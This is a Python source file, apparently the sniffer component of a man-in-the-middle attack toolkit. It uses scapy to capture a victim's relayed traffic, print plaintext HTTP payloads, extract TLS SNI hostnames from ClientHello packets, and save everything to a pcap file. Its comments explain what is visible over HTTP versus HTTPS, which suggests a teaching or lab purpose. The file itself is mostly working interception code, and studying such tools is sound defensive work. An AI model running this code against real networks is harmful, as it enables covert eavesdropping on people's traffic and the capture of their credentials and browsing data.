#!/usr/bin/env python3
"""
Sniffer: watches the relayed traffic and reports what's visible on each
protocol. HTTP is plaintext, so payloads are printed directly. HTTPS is
encrypted, so we can only report metadata -- packet counts and the
hostname from the TLS ClientHello (SNI), which is sent unencrypted even
over an HTTPS connection. Everything captured is also written to a pcap
file so it can be reopened in Wireshark afterwards.
"""
from scapy.all import sniff, wrpcap, IP, TCP, Raw
from config import TARGET_CONFIG

https_packet_count = 0
captured_packets = []
PCAP_FILE = "mitm_capture.pcap"
SAVE_EVERY = 25  # flush to disk periodically instead of holding everything in memory


def extract_sni(payload: bytes):
    """
    Pull the SNI hostname out of a TLS ClientHello by hand, so we don't
    need an extra TLS-parsing dependency just for one field.
    Layout: record header(5) + handshake header(4) + version(2) + random(32),
    then session id, cipher suites, compression methods, then extensions.
    """
    try:
        if len(payload) < 6 or payload[0] != 0x16:      # 0x16 = Handshake record
            return None
        if payload[5] != 0x01:                          # 0x01 = ClientHello
            return None
        pos = 43
        session_id_len = payload[pos]
        pos += 1 + session_id_len
        cipher_len = int.from_bytes(payload[pos:pos + 2], 'big')
        pos += 2 + cipher_len
        comp_len = payload[pos]
        pos += 1 + comp_len
        ext_total_len = int.from_bytes(payload[pos:pos + 2], 'big')
        pos += 2
        end = pos + ext_total_len
        while pos < end:
            ext_type = int.from_bytes(payload[pos:pos + 2], 'big')
            ext_len = int.from_bytes(payload[pos + 2:pos + 4], 'big')
            if ext_type == 0x0000:  # server_name extension
                name_len_pos = pos + 4 + 3
                name_len = int.from_bytes(payload[name_len_pos:name_len_pos + 2], 'big')
                name_start = name_len_pos + 2
                return payload[name_start:name_start + name_len].decode(errors='ignore')
            pos += 4 + ext_len
    except Exception:
        return None
    return None


def analyze_packet(packet):
    """
    Inspect one sniffed TCP/IP packet and print whatever is visible for
    its protocol (full payload for HTTP, metadata/SNI only for HTTPS),
    while buffering it for the periodic pcap flush.

    Called once per packet by run_sniffer()'s sniff() loop.
    """
    global https_packet_count
    try:
        if not (packet.haslayer(IP) and packet.haslayer(TCP)):
            return

        captured_packets.append(packet)
        if len(captured_packets) >= SAVE_EVERY:
            wrpcap(PCAP_FILE, captured_packets, append=True)
            captured_packets.clear()

        ip_layer = packet[IP]
        tcp_layer = packet[TCP]

        # Plaintext HTTP - the payload is readable as-is.
        if tcp_layer.dport == 80 or tcp_layer.sport == 80:
            if packet.haslayer(Raw):
                payload = packet[Raw].load
                print(f"\n[HTTP Intercepted] {ip_layer.src}:{tcp_layer.sport} -> {ip_layer.dst}:{tcp_layer.dport}")
                print(f"    Payload: {payload[:150]}...\n")

        # HTTPS - payload is encrypted, so we only report what's visible:
        # the SNI hostname from the handshake, and packet volume.
        elif tcp_layer.dport == 443 or tcp_layer.sport == 443:
            https_packet_count += 1
            if packet.haslayer(Raw):
                sni = extract_sni(bytes(packet[Raw].load))
                if sni:
                    print(f"[HTTPS ClientHello] {ip_layer.src} -> {ip_layer.dst}  SNI: {sni}")
            if https_packet_count % 50 == 0:
                print(f"[HTTPS Activity] Handled {https_packet_count} secure packets "
                      f"(payload encrypted -- only metadata visible: size/timing/SNI).")
    except Exception:
        pass


def run_sniffer():
    """
    Start the sniff loop that captures the victim's forwarded traffic
    for analysis, and make sure any buffered packets are flushed to the
    pcap file even if the loop exits (e.g. via Ctrl+C).

    This runs on the main thread and blocks until interrupted, acting as
    the process's "keep alive" while poisoner/forwarder run in the
    background (see main.py).
    """
    victim_ip = TARGET_CONFIG["victim_ip"]
    print(f"[*] Sniffer active: monitoring {victim_ip}... (saving evidence to {PCAP_FILE})\n")
    try:
        sniff(filter=f"host {victim_ip}", prn=analyze_packet, store=0, iface=TARGET_CONFIG["interface"])
    finally:
        # Without this, up to SAVE_EVERY-1 captured packets sitting in the
        # in-memory buffer at the moment of Ctrl+C would be lost instead
        # of making it into the pcap file.
        if captured_packets:
            wrpcap(PCAP_FILE, captured_packets, append=True)
